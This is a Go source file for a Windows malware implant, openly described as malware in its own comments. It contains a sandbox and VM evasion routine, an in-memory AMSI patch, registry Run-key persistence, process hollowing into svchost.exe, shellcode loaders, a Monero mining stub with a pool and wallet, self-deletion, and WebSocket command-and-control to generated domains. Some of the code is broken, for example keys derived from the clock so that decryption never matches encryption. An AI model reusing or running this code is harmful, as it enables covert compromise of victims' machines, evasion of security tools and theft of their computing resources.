package main

import (
	"crypto/aes"    // For AES-256 encryption of data
	"crypto/cipher" // For cipher stream operations (GCM mode)
	"crypto/rand"   // For generating random IVs and delays
	"crypto/rc4"    // For RC4 encryption (from second code)
	"crypto/sha256" // For key derivation in PBKDF2
	"crypto/tls"
	"encoding/base64" // For encoding/decoding encrypted strings
	// For hex encoding/decoding of C2 IPs
	"fmt"       // For string formatting (e.g., dynamic keys)
	"io"        // For IO operations (e.g., random IV generation)
	"io/ioutil" // For reading files (e.g., payload.bin)
	"math/rand" // For random string generation
	"net"       // For MAC address checks
	"os"        // For file and process operations
	"os/exec"   // For executing system commands (e.g., go build)
	"runtime"   // For system info (e.g., CPU count) and scheduling
	"strings"   // For string manipulation (e.g., MAC prefix check)
	"syscall"   // For low-level system calls
	"time"      // For delays and dynamic behavior
	"unsafe"    // For direct memory manipulation (e.g., AMSI bypass)

	"github.com/f1zm0/acheron"          // Indirect syscalls for AV/EDR evasion
	"github.com/gorilla/websocket"      // For WebSocket-based C2 communication
	"golang.org/x/crypto/pbkdf2"        // For key derivation with PBKDF2
	"golang.org/x/sys/windows"          // For Windows-specific APIs
	"golang.org/x/sys/windows/registry" // For registry-based persistence
)

const (
	Version = "1.1"

	// Banner: UTF-8 art for display
	Banner = `
██╗    ██╗██████╗ ██████╗ ████████╗███╗   ███╗
██║    ██║██╔══██╗██╔══██╗╚══██╔══╝████╗ ████║
██║ █╗ ██║██║  ██║██████╔╝   ██║   ██╔████╔██║
██║███╗██║██║  ██║██╔═══╝    ██║   ██║╚██╔╝██║
╚███╔███╔╝██████╔╝██║        ██║   ██║ ╚═╝ ██║
 ╚══╝╚══╝ ╚═════╝ ╚═╝        ╚═╝   ╚═╝     ╚═╝
                                    
        
`

	// Memory constants from second code
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

// **Configuration (Obfuscated and Encrypted)**
var (
	// c2Seed_encrypted: Hex-encoded, XOR-encrypted seed for C2 domains
	// Dev Comment: Used in DGA-like domain generation for stealthy C2
	c2Seed_encrypted = "A29c9b9b99d2"

	// c2Key: XOR key for decrypting sensitive strings
	// Dev Comment: Simple XOR key to obscure static strings
	c2Key = byte(0x55)

	// encryptionKey_encrypted: Base64-encoded salt for AES key
	// Dev Comment: Decoded at runtime for dynamic AES keys
	encryptionKey_encrypted = "sNs2g1gNs2g1g="

	// encodedMiningPool_encrypted: Base64-encoded Monero pool
	// Dev Comment: Decrypts to "gulf.moneroocean.stream:10001"
	encodedMiningPool_encrypted = "Z3VsZi5tb25lcm9vY2Vhbi5zdHJlYW06MTAwMDE="

	// encodedWallet_encrypted: Base64-encoded Monero wallet
	// Dev Comment: Long wallet address for mining revenue
	encodedWallet_encrypted = "NDNkSzJ5WTduVFdWSHFuTDJwWHF6c1paZVB4MTQ4NUVwNnJ1a21jcUg4Y1RKb2R3NkgxUDVnNTI0ZUNQaWRqTVg0NzMxcQl2ODNoa3IyRFFXMWRoa2I3cEQxZ1lSVkw="

	// payload_encrypted: Base64 + XOR-encrypted shellcode
	// Dev Comment: Replace with msfvenom-generated shellcode
	payload_encrypted = "U2hlbGxjb2RlSGVyZQ=="
	payloadKey        = byte(0xAA)

	// macList: List of VM-associated MAC prefixes
	// Dev  used for VM detection
	macList = []string{"00:0c:29", "00:50:56", "08:00:27", "52:54:00", "00:21:F6", "00:14:4F", "00:0F:4B", "00:10:E0", "00:00:7D", "00:21:28", "00:01:5D", "00:A0:A4",
		"00:07:82", "00:03:BA", "08:00:20", "2C:C2:60", "00:10:4F", "00:13:97", "00:20:F2"}
)

// **Global Variables**
var (
	// encryptionKey_salt: Salt for AES key derivation
	// Dev Comment: Decoded at runtime for encryption
	encryptionKey_salt []byte

	// DLLs and procs from second code
	// Dev Comment: Used for shellcode execution
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")

	// rc4Key: Random key for RC4 encryption
	// Dev Comment: From second code, used in dynamic Go generation
	rc4Key = randomString(5)
)

// **Dynamic API Pointers (Hashed)**
var (
	// Hashed API names for dynamic resolution
	// Dev Comment: Obscures API calls from static analysis
	hashOpenProcess        = uint32(0x4e5f4b4c)
	hashVirtualAllocEx     = uint32(0x5a6b7c8d)
	hashVirtualProtectEx   = uint32(0x7b8c9dae)
	hashWriteProcessMemory = uint32(0x9d0ebf1c)
	hashCreateRemoteThread = uint32(0x2f3d4e5f)
	hashCreateProcessW     = uint32(0x6a7b8c9d)
	hashIsDebuggerPresent  = uint32(0x8e9facbd)
)

// **Initialization**
func init() {
	// Dev Comment: Load kernel32.dll lazily and resolve APIs dynamically
	kernel32Lazy := windows.NewLazyDLL("kernel32.dll")
	resolveAPI(kernel32Lazy, hashOpenProcess)
	resolveAPI(kernel32Lazy, hashVirtualAllocEx)
	resolveAPI(kernel32Lazy, hashVirtualProtectEx)
	resolveAPI(kernel32Lazy, hashWriteProcessMemory)
	resolveAPI(kernel32Lazy, hashCreateRemoteThread)
	resolveAPI(kernel32Lazy, hashCreateProcessW)
	resolveAPI(kernel32Lazy, hashIsDebuggerPresent)

	// Decode AES salt
	encryptionKey_salt, _ = base64.StdEncoding.DecodeString(encryptionKey_encrypted)
}

// **Utility Functions**

// ShowBanner: Displays ASCII banner
// Dev Comment: From second code, aesthetic startup output
func ShowBanner() {
	fmt.Printf(Banner, Version)
}

// hashAPI: Generates hash for API names
// Dev Comment: Used for dynamic API resolution
func hashAPI(name string) uint32 {
	var hash uint32 = 0
	for _, c := range name {
		hash = (hash << 5) + uint32(c)
	}
	return hash
}

// resolveAPI: Resolves Windows API by hash
// Dev Comment: Reduces static signatures
func resolveAPI(dll *windows.LazyDLL, hash uint32) *windows.LazyProc {
	for _, proc := range []string{
		"OpenProcess", "VirtualAllocEx", "VirtualProtectEx",
		"WriteProcessMemory", "CreateRemoteThread", "CreateProcessW",
		"IsDebuggerPresent",
	} {
		if hashAPI(proc) == hash {
			return dll.NewProc(proc)
		}
	}
	return nil
}

// decryptString: Decrypts base64 + XOR-encrypted strings
// Dev Comment: Dual-layer encryption for config data
func decryptString(encrypted string, key byte) string {
	data, _ := base64.StdEncoding.DecodeString(encrypted)
	return string(xorBytes(data, key))
}

// xorBytes: Applies XOR encryption/decryption
// Dev Comment: Simple obfuscation for payload/config
func xorBytes(b []byte, key byte) []byte {
	result := make([]byte, len(b))
	for i, v := range b {
		result[i] = v ^ key
	}
	return result
}

// encrypt: AES-256-GCM encryption
// Dev Comment: Upgraded to GCM for authenticated encryption (EXOCET-inspired)
func encrypt(data []byte) ([]byte, error) {
	key := pbkdf2.Key([]byte(fmt.Sprintf("key%d", time.Now().UnixNano())), encryptionKey_salt, 4096, 32, sha256.New)
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, data, nil), nil
}

// decrypt: AES-256-GCM decryption
// Dev Comment: Matches encrypt() for secure C2
func decrypt(ciphertext []byte) ([]byte, error) {
	key := pbkdf2.Key([]byte(fmt.Sprintf("key%d", time.Now().UnixNano())), encryptionKey_salt, 4096, 32, sha256.New)
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// randomString: Generates random string for RC4 key
// Dev Comment: From second code, used in Go code generation
func randomString(len int) string {
	rand.Seed(time.Now().UnixNano())
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		bytes[i] = byte(65 + rand.Intn(26)) // A-Z
	}
	return string(bytes)
}

// enc: RC4 encrypts shellcode
// Dev Comment: From second code, used for dynamic Go payload
func enc(src string) string {
	shellcode := []byte(src)
	encShellcode := make([]byte, len(shellcode))
	cipher, _ := rc4.NewCipher([]byte(rc4Key))
	cipher.XORKeyStream(encShellcode, shellcode)
	return base64.StdEncoding.EncodeToString(encShellcode)
}

// dec: RC4 decrypts shellcode
// Dev Comment: From second code, used in generated Go code
func dec(src string) []byte {
	data, _ := base64.StdEncoding.DecodeString(src)
	decShellcode := make([]byte, len(data))
	cipher, _ := rc4.NewCipher([]byte(rc4Key))
	cipher.XORKeyStream(decShellcode, data)
	return decShellcode
}

// runshellcode: Executes shellcode in memory
// Dev Comment: From second code, uses VirtualAlloc and RtlMoveMemory
func runshellcode(charcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		fmt.Println("VirtualAlloc failed:", err)
		os.Exit(1)
	}
	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}

// **Anti-Analysis**

// isUnderAnalysis: Detects debuggers, VMs, sandboxes
// Dev Comment: Combines first code's checks with MAC detection from second
func isUnderAnalysis() bool {
	proc := resolveAPI(windows.NewLazyDLL("kernel32.dll"), hashIsDebuggerPresent)
	if proc.Call() != 0 {
		return true
	}
	// Timing check
	start := time.Now()
	for i := 0; i < 1000000; i++ {
		runtime.Gosched()
	}
	if time.Since(start) > 100*time.Millisecond {
		return true
	}
	// CPU and VM artifact checks
	if runtime.NumCPU() < 2 || checkVMArtifacts() || byMacAddress() {
		return true
	}
	return false
}

// checkVMArtifacts: Checks for VM files
// Dev Comment: From first code, encrypted paths
func checkVMArtifacts() bool {
	artifacts := []string{
		decryptString("Qzpcd2luZG93c1xzeXN0ZW0zMlxkcml2ZXJzXHZWb3hNb3VzZS5zeXM=", c2Key),
	}
	for _, f := range artifacts {
		if _, err := os.Stat(f); err == nil {
			return true
		}
	}
	return false
}

// byMacAddress: Checks MAC address for VM prefixes
// Dev Comment: From second code, detects virtualized environments
func byMacAddress() bool {
	ifaces, _ := net.Interfaces()
	for _, ifa := range ifaces {
		mac := ifa.HardwareAddr.String()
		if mac != "" {
			for _, prefix := range macList {
				if strings.HasPrefix(mac, prefix) {
					return true
				}
			}
		}
	}
	return false
}

// selfDestruct: Removes executable
// Dev Comment: Anti-forensic measure
func selfDestruct() {
	path, _ := os.Executable()
	os.Remove(path)
	os.Exit(0)
}

// **AMSI Bypass**

// bypassAMSI: Patches AMSI in memory
// Dev Comment: Disables script scanning
func bypassAMSI() {
	amsi := windows.NewLazyDLL("amsi.dll")
	amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")
	if amsiScanBuffer.Addr() != 0 {
		var oldProtect uint32
		proc := resolveAPI(windows.NewLazyDLL("kernel32.dll"), hashVirtualProtectEx)
		proc.Call(amsiScanBuffer.Addr(), uintptr(1), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
		*(*byte)(unsafe.Pointer(amsiScanBuffer.Addr())) = 0xC3
	}
}

// **Process Hollowing**

// hollowProcess: Executes payload in svchost.exe
// Dev Comment: Uses acheron for stealth (research-inspired)
func hollowProcess(payload []byte) {
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	path := syscall.StringToUTF16Ptr("C:\\Windows\\System32\\svchost.exe")

	err := acheron.CreateProcess(
		path, nil, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &si, &pi,
	)
	if err != nil {
		return
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	addr, err := acheron.VirtualAllocEx(pi.Process, 0, uint(len(payload)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return
	}

	err = acheron.WriteProcessMemory(pi.Process, addr, payload, uint(len(payload)))
	if err != nil {
		return
	}

	_, err = acheron.CreateRemoteThread(pi.Process, nil, 0, addr, 0, 0)
	if err != nil {
		return
	}
}

// **Persistence**

// establishPersistence: Sets up registry and watchdog
// Dev Comment: Ensures malware restarts
func establishPersistence() {
	k, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	defer k.Close()
	path, _ := os.Executable()
	k.SetStringValue("WindowsSvcUpdate", path)

	go func() {
		for {
			if _, err := os.Stat(path); os.IsNotExist(err) {
				exec.Command(path).Start()
			}
			time.Sleep(10 * time.Second)
		}
	}()
}

// **Custom Miner**

// startMining: Simulates Monero mining
// Dev Comment: Placeholder for RandomX miner
func startMining() {
	pool := decryptString(encodedMiningPool_encrypted, c2Key)
	wallet := decryptString(encodedWallet_encrypted, c2Key)
	go func() {
		for {
			data := []byte(fmt.Sprintf("%s:%s:%d", pool, wallet, time.Now().UnixNano()))
			sha256.Sum256(data)
			time.Sleep(1 * time.Millisecond)
		}
	}()
}

// **Dynamic Go Code Generation**

// genGoExe: Generates and builds Go executable
// Dev Comment: From, creates stealthy payload
func genGoExe(encData string) {
	os.Mkdir("GoBPTemp", 0777)
	defer os.RemoveAll("./GoBPTemp")

	cmd := exec.Command("cmd.exe", "/c", "go mod init main")
	cmd.Dir = "GoBPTemp"
	if err := cmd.Run(); err != nil {
		fmt.Println("No Go Env:", err)
		return
	}

	codeText := fmt.Sprintf(`
package main
import (
	"crypto/rc4"
	"encoding/base64"
	"syscall"
	"unsafe"
)
var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)
func runshellcode(charcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	for j := 0; j < len(charcode); j++ { charcode[j] = 0 }
	syscall.Syscall(addr, 0, 0, 0, 0)
}
func dec(src string) []byte {
	data, _ := base64.StdEncoding.DecodeString(src)
	decShellcode := make([]byte, len(data))
	cipher, _ := rc4.NewCipher([]byte("%s"))
	cipher.XORKeyStream(decShellcode, data)
	return decShellcode
}
var enc_data = "%s"
func main() {
	shellcodefin := dec(enc_data)
	runshellcode(shellcodefin)
}`, rc4Key, encData)

	f, err := os.OpenFile("GoBPTemp/GOrun.go", os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		fmt.Println("Create file failed:", err)
		return
	}
	defer f.Close()
	io.WriteString(f, codeText)

	cmd2 := exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-s -w", "GOrun.go")
	cmd2.Dir = "GoBPTemp"
	if err := cmd2.Run(); err != nil {
		fmt.Println("Build failed:", err)
		return
	}

	cmd3 := exec.Command("cmd.exe", "/c", "copy .\\GOrun.exe .\\..\\GoBP.exe")
	cmd3.Dir = "GoBPTemp"
	if err := cmd3.Run(); err != nil {
		fmt.Println("Copy failed:", err)
		return
	}
	fmt.Println("GoBP Generated!")
}

// **C2 Communication**

// connectC2: Establishes WebSocket C2
// Dev Comment: Uses DGA-like domain and AES-GCM
func connectC2() {
	seed := decryptString(c2Seed_encrypted, c2Key)
	domain := fmt.Sprintf("wss://dga%s%d.com/ws", seed, time.Now().UnixNano()%10000)
	dialer := websocket.Dialer{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	conn, _, err := dialer.Dial(domain, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	go func() {
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				return
			}
			cmd, _ := decrypt(msg)
			switch string(cmd) {
			case "start_mining":
				startMining()
			case "self_destruct":
				selfDestruct()
			}
		}
	}()

	data := []byte(fmt.Sprintf("Host: %s", os.Getenv("COMPUTERNAME")))
	encrypted, _ := encrypt(data)
	conn.WriteMessage(websocket.BinaryMessage, encrypted)
}

// **Main Function**

// main: Entry point with all features
// Dev Comment: Combines bypassing, mining, and C2
func main() {
	ShowBanner()
	if isUnderAnalysis() {
		selfDestruct()
		return
	}

	time.Sleep(time.Duration(rand.Intn(15)) * time.Second)
	bypassAMSI()
	establishPersistence()

	// Generate dynamic Go executable from payload.bin
	payloadData, err := ioutil.ReadFile("./payload.bin")
	if err == nil {
		encData := enc(string(payloadData))
		genGoExe(encData)
	}

	// Execute encrypted shellcode via process hollowing
	payload := xorBytes([]byte(decryptString(payload_encrypted, payloadKey)), payloadKey)
	hollowProcess(payload)

	go connectC2()
	select {}
}
